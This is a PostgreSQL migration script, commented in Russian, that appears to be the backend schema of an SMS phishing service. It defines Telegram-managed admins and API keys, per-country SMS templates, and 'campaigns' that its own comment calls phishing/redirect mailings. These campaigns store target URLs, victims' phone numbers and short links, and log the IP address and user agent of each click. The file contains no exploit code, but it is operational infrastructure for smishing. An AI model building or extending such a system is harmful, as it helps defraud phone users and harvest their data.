-- Восстанавливаем и расширяем схему для администрирования, шаблонов и кампаний.

-- Администраторы
CREATE TABLE IF NOT EXISTS admins (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    telegram_id BIGINT NOT NULL UNIQUE,
    username TEXT,
    is_owner BOOLEAN NOT NULL DEFAULT FALSE,
    sender_name TEXT,
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- API-ключи (создаются через Telegram-бота)
CREATE TABLE IF NOT EXISTS api_keys (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    key_hash TEXT NOT NULL UNIQUE,
    name TEXT NOT NULL,
    is_active BOOLEAN NOT NULL DEFAULT TRUE,
    created_by_telegram_id BIGINT,
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    last_used_at TIMESTAMPTZ
);

-- SMS-шаблоны: несколько шаблонов на страну, один избранный на страну
CREATE TABLE IF NOT EXISTS templates (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    country_code VARCHAR(2) NOT NULL,
    name TEXT,
    text TEXT NOT NULL,
    is_active BOOLEAN NOT NULL DEFAULT TRUE,
    is_favorite BOOLEAN NOT NULL DEFAULT FALSE,
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_templates_country ON templates(country_code);
CREATE INDEX IF NOT EXISTS idx_templates_favorite ON templates(country_code, is_favorite);

-- Кампании (фишинг/редирект рассылки)
CREATE TABLE IF NOT EXISTS campaigns (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    short_code VARCHAR(16) NOT NULL UNIQUE,
    target_url TEXT NOT NULL,
    phone TEXT NOT NULL,
    country_code VARCHAR(2) NOT NULL,
    message TEXT NOT NULL,
    status VARCHAR(32) NOT NULL DEFAULT 'pending',
    click_count INT NOT NULL DEFAULT 0,
    sent_by_telegram_id BIGINT,
    api_key_id UUID REFERENCES api_keys(id) ON DELETE SET NULL,
    provider_response JSONB,
    sent_at TIMESTAMPTZ,
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_campaigns_short_code ON campaigns(short_code);
CREATE INDEX IF NOT EXISTS idx_campaigns_status ON campaigns(status);
CREATE INDEX IF NOT EXISTS idx_campaigns_created_at ON campaigns(created_at);

-- Детализация кликов по кампаниям
CREATE TABLE IF NOT EXISTS campaign_clicks (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    campaign_id UUID NOT NULL REFERENCES campaigns(id) ON DELETE CASCADE,
    ip TEXT,
    user_agent TEXT,
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_campaign_clicks_campaign ON campaign_clicks(campaign_id);

-- Восстанавливаем связи в логах SMS
ALTER TABLE sms_logs
    ADD COLUMN IF NOT EXISTS api_key_id UUID REFERENCES api_keys(id) ON DELETE SET NULL,
    ADD COLUMN IF NOT EXISTS telegram_id BIGINT,
    ADD COLUMN IF NOT EXISTS campaign_id UUID REFERENCES campaigns(id) ON DELETE SET NULL;

CREATE INDEX IF NOT EXISTS idx_sms_logs_api_key ON sms_logs(api_key_id);
CREATE INDEX IF NOT EXISTS idx_sms_logs_campaign ON sms_logs(campaign_id);
